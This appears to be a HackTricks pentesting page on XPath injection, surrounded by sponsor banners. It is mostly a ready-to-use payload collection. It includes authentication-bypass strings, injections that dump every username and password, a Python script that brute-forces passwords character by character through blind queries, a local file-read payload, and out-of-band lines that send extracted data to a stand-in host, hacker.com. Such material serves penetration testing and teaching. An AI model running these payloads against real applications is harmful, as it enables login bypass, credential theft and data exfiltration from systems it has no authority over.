# XPATH injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

## **Basic Syntax**

XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

Info about how to make queries: [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

### Nodes

| Expression | Description                                                                                           |
| ---------- | ----------------------------------------------------------------------------------------------------- |
| nodename   | Selects all nodes with the name "nodename"                                                            |
| /          | Selects from the root node                                                                            |
| //         | Selects nodes in the document from the current node that match the selection no matter where they are |
| .          | Selects the current node                                                                              |
| ..         | Selects the parent of the current node                                                                |
| @          | Selects attributes                                                                                    |

### **Examples:**

| Path Expression | Result                                                                                                                                 |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| bookstore       | Selects all nodes with the name "bookstore"                                                                                            |
| /bookstore      | Selects the root element bookstore**Note:** If the path starts with a slash ( / ) it always represents an absolute path to an element! |
| bookstore/book  | Selects all book elements that are children of bookstore                                                                               |
| //book          | Selects all book elements no matter where they are in the document                                                                     |
| bookstore//book | Selects all book elements that are descendant of the bookstore element, no matter where they are under the bookstore element           |
| //@lang         | Selects all attributes that are named lang                                                                                             |

### Predicates

| Path Expression                     | Result                                                                                                                                                                                                                                                                                                         |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /bookstore/book\[1]                 | <p>Selects the first book element that is the child of the bookstore element.<strong>Note:</strong> In IE 5,6,7,8,9 first node is[0], but according to W3C, it is [1]. To solve this problem in IE, set the SelectionLanguage to XPath:</p><p>In JavaScript: xml.setProperty("SelectionLanguage","XPath");</p> |
| /bookstore/book\[last()]            | Selects the last book element that is the child of the bookstore element                                                                                                                                                                                                                                       |
| /bookstore/book\[last()-1]          | Selects the last but one book element that is the child of the bookstore element                                                                                                                                                                                                                               |
| /bookstore/book\[position()<3]      | Selects the first two book elements that are children of the bookstore element                                                                                                                                                                                                                                 |
| //title\[@lang]                     | Selects all the title elements that have an attribute named lang                                                                                                                                                                                                                                               |
| //title\[@lang='en']                | Selects all the title elements that have a "lang" attribute with a value of "en"                                                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]       | Selects all the book elements of the bookstore element that have a price element with a value greater than 35.00                                                                                                                                                                                               |
| /bookstore/book\[price>35.00]/title | Selects all the title elements of the book elements of the bookstore element that have a price element with a value greater than 35.00                                                                                                                                                                         |

### Unknown Nodes

| Wildcard | Description                  |
| -------- | ---------------------------- |
| \*       | Matches any element node     |
| @\*      | Matches any attribute node   |
| node()   | Matches any node of any kind |

### **Examples:**

| Path Expression | Result                                                                   |
| --------------- | ------------------------------------------------------------------------ |
| /bookstore/\*   | Selects all the child element nodes of the bookstore element             |
| //\*            | Selects all elements in the document                                     |
| //title\[@\*]   | Selects all title elements which have at least one attribute of any kind |

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

## Example

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
    <name>pepe</name>
    <password>peponcio</password>
    <account>admin</account>
</user>
<user>
    <name>mark</name>
    <password>m12345</password>
    <account>regular</account>
</user>
<user>
    <name>fino</name>
    <password>fino2</password>
    <account>regular</account>
</user>
</data>
```

### Access the information

```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```

### Identify & stealing the schema

```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
    <a>
        <b></b>
    </a>
    <c>
        <d></d>
        <e></e>
        <f>
            <h></h>
        </f>
    </c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```

## Authentication Bypass

### **Example of queries:**

```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```

### **OR bypass in user and password (same value in both)**

```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```

### **Abusing null injection**

```
Username: ' or 1]%00
```

### **Double OR in Username or in password** (is valid with only 1 vulnerable field)

IMPORTANT: Notice that the **"and" is the first operation made**.

```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2º account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```

## String extraction

The output contains strings and the user can manipulate the values to search:

```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```

## Blind Explotation

### **Get length of a value and extract it by comparisons:**

```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```

### **Python Example**

```python
import requests, string 

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30): 
    r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i)) 
    if ("TRUE_COND" in r.text): 
        l = i 
        break 
print("[+] Password length: " + str(l)) 
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i)) 
    for al in alphabet: 
        r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
        if ("TRUE_COND" in r.text): 
            flag += al
            print("[+] Flag: " + flag) 
            break
```

### Read file

```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```

## OOB Exploitation

```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```

### Automatic tool

{% embed url="https://xcat.readthedocs.io/" %}

## References

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20injection" %}

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
